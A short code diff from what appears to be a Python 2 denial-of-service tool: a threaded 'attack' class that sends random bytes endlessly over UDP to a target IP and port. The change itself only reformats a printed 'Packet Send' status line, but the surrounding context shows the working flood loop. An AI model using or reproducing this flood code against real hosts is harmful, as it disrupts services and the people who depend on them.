@@ -78,7 +78,7 @@ class attack(threading.Thread):
         bytes = random._urandom(self.size)
         while True:
             s.sendto(bytes,(self.ip, self.port))
-            print colors.vermelho + " [*] Packet Send : " + " : "+colors.verde + self.ip
+            print colors.vermelho + " [*] Packet Send:" + ":"+colors.verde + self.ip
       except KeyboardInterrupt:
         print('')
         print(colors.R+ "[!] Exiting...")
